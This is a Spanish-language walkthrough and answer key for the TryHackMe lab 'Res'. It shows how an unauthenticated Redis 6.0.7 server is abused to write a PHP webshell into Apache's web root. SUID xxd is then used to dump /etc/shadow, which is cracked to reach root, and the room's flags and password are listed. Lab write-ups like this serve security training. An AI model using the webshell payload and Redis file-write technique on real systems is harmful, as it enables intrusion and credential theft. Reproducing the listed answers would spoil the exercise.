# Res

| **Dificultad** | Easy |
| **Tipo** | Walkthrough |
| **Slug** | `res` |
| **Link** | [TryHackMe](https://tryhackme.com/room/res) |
| **Sección** | 01 Level Easy |
| **Fuente** | Writeups públicos de thmrevenant, 2br007, jc01.ninja, Harellevy (Medium), noobsixt9 (Medium) y rarpunzel (Medium) |
| **Componentes** | nmap / redis-cli / Redis 6.0.7 / PHP webshell / Apache / SUID xxd / John the Ripper / sudo |
| **Impacto** | RCE a partir de un Redis 6.0.7 sin autenticación y escalada a root abusando el SUID de xxd para leer /etc/shadow |

---

**Contexto:** Res es una máquina Linux que explota un servidor Redis 6.0.7 expuesto sin autenticación en el puerto 6379. Mediante `redis-cli` se escribe una webshell PHP en el document root de Apache, logrando RCE como `www-data`. La escalada de privilegios aprovecha el binario SUID `xxd` para leer `/etc/shadow`, cuyo hash de la usuaria `vianka` se crackea con John The Ripper (contraseña `beautiful1`); `vianka` tiene permisos sudo totales y `sudo su` concede root.

## Solucionario

### Task 1: Redis sin credenciales y escalada con xxd / Unauthenticated Redis and xxd Privilege Escalation

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Scan the machine, how many ports are open? | `2` |
| 2 | What's is the database management system installed on the server? | `redis` |
| 3 | What port is the database management system running on? | `6379` |
| 4 | What's is the version of management system installed on the server? | `6.0.7` |
| 5 | Compromise the machine and locate user.txt | `thm{red1s_rce_w1thout_credent1als}` |
| 6 | What is the local user account password? | `beautiful1` |
| 7 | Escalate privileges and obtain root.txt | `thm{xxd_pr1v_escalat1on}` |

---

**Metodología:**
1. **Reconocimiento:** `nmap -sC -sV -p-` contra la máquina revela solo dos puertos: 80 (Apache 2.4.18) y 6379 (Redis key-value store 6.0.7).
2. **Conexión a Redis:** `redis-cli -h <IP>` permite conectarse sin credenciales; el comando `INFO` confirma la versión y revela nombres de usuario potenciales como `vianka`.
3. **RCE vía Redis:** se configura el directorio del servidor web con `CONFIG SET dir /var/www/html`, `CONFIG SET dbfilename shell.php`, se almacena el payload PHP con `SET x "<?php system($_GET['cmd']); ?>"` y se persiste con `SAVE`.
4. **Webshell y reverse shell:** se accede a `http://<IP>/shell.php?cmd=...` para ejecutar comandos; una reverse shell vía `nc` o `python3 -c` da una sesión como `www-data`.
5. **Enumeración de privilegios:** `find / -type f -perm -4000 2>/dev/null` encuentra `/usr/bin/xxd` con SUID; en GTFOBins se confirma lectura/escritura arbitraria de archivos.
6. **Lectura de /etc/shadow y crackeo:** `LFILE=/etc/shadow; xxd "$LFILE" | xxd -r` vuelca el shadow; el hash de `vianka` se crackea con `john --wordlist=/usr/share/wordlists/rockyou.txt` dando `beautiful1`.
7. **Root:** `su vianka` (password `beautiful1`), `sudo -l` muestra permisos `(ALL : ALL) ALL`, y `sudo su` entrega una shell de root, la flag `user.txt` (`thm{red1s_rce_w1thout_credent1als}`), la contraseña local `beautiful1` y `root.txt` (`thm{xxd_pr1v_escalat1on}`).

**Learning chain:** nmap → 80 (Apache) + 6379 (Redis 6.0.7) → redis-cli sin credenciales → CONFIG SET dir/dbfilename + SET + SAVE → webshell.php → RCE (www-data) → SUID /usr/bin/xxd → leer /etc/shadow → john → beautiful1 (vianka) → su vianka → sudo su → root → root.txt

**MITRE ATT&CK:** T1046 (Network Service Scanning), T1210 (Exploitation of Remote Services), T1059 (Command and Scripting Interpreter), T1003.001 (OS Credential Dumping: /etc/passwd and /etc/shadow), T1548.001 (Abuse Elevation Control Mechanism: Setuid and Setgid)

**Fuente:** [TryHackMe - Res](https://tryhackme.com/room/res)